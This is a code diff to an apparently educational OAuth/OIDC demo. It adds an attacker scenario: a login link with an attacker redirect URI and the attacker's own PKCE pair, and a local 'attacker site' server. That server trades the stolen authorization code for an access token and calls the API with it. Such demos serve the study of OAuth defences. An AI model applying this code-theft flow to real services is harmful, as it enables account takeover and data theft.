@@ -11,6 +11,8 @@ import {
 	API_AUDIENCE,
 	API_CLIENT,
 	APP,
+	ATTACKER_REDIRECT_URI,
+	ATTACKER_SITE,
 	BROKERED_REALM,
 	DIRECTORY_REALM,
 	CLIENT_SECRET,
@@ -363,6 +365,8 @@ export class Demo {
 	#seenProofs = new Set<string>();
 	/** Someone is handing the real app a stolen code, from a login of their own. */
 	#handed = false;
+	/** What someone else made for a login link of their own, which they keep. */
+	#theirVerifier: string | null = null;
 
 	get #run() {
 		if (!this.current) throw new Error('No run in progress');
@@ -413,6 +417,53 @@ export class Demo {
 			...(this.#key ? { dpop: this.#key.proof('POST', url, nonce ? { nonce } : {}) } : {})
 		};
 		return call(run, steps, 'POST', url, headers, body);
+	}
+
+	/** A login link someone else made for the real app, with an address and a PKCE pair of their own. */
+	theirLink() {
+		const { settings, clientId } = this.#run;
+		this.#theirVerifier = settings.pkce ? random() + random() : null;
+		const query = new URLSearchParams({
+			response_type: 'code',
+			client_id: clientId,
+			redirect_uri: ATTACKER_REDIRECT_URI,
+			state: random()
+		});
+		if (settings.oidc) {
+			query.set('scope', 'openid');
+			query.set('nonce', random());
+		}
+		if (this.#theirVerifier) {
+			query.set('code_challenge', sha256(this.#theirVerifier));
+			query.set('code_challenge_method', 'S256');
+		}
+		return `${this.#server.authorization_endpoint}?${query}`;
+	}
+
+	/** A code that came to their own address, traded as the real app would. Each answer is real. */
+	async #tradeTheirs(code: string) {
+		const run = this.#run;
+		const body: Record<string, string> = {
+			grant_type: 'authorization_code',
+			code,
+			redirect_uri: ATTACKER_REDIRECT_URI,
+			client_id: run.clientId
+		};
+		if (this.#theirVerifier) body.code_verifier = this.#theirVerifier;
+		const result = await call(
+			run,
+			['attacker-token-request', 'attacker-token-response'],
+			'POST',
+			this.#server.token_endpoint,
+			{},
+			body
+		);
+		const stolen = jsonOf<Tokens>(result.text).access_token;
+		if (!stolen) return 'Refused';
+		await call(run, ['attacker-api-request', 'attacker-api-response'], 'GET', `${API}/resource`, {
+			authorization: `Bearer ${stolen}`
+		});
+		return 'Got it';
 	}
 
 	/** What someone else can do with the same code, in the moment it goes by. Each answer is real. */
@@ -1205,11 +1256,24 @@ export class Demo {
 			response.end(`<h1>${outcome}</h1>`);
 		});
 
+		// Someone else's site, which a link of theirs sends the code to, and which trades it at once.
+		const theirs = createServer(async (request, response) => {
+			const code = new URL(request.url ?? '/', ATTACKER_SITE).searchParams.get('code');
+			let outcome = 'Nothing came';
+			if (code && this.current) {
+				await settle();
+				outcome = await this.#tradeTheirs(code);
+			}
+			response.writeHead(200, { 'content-type': 'text/html' });
+			response.end(`<h1>${outcome}</h1>`);
+		});
+
 		await listen(app, APP);
 		await listen(api, API);
 		await listen(proxy, `http://0.0.0.0:${PROXY_PORT}`);
 		await listen(second, SECOND_APP);
-		this.#servers = [app, api, proxy, second];
+		await listen(theirs, ATTACKER_SITE);
+		this.#servers = [app, api, proxy, second, theirs];
 	}
 
 	stop() {
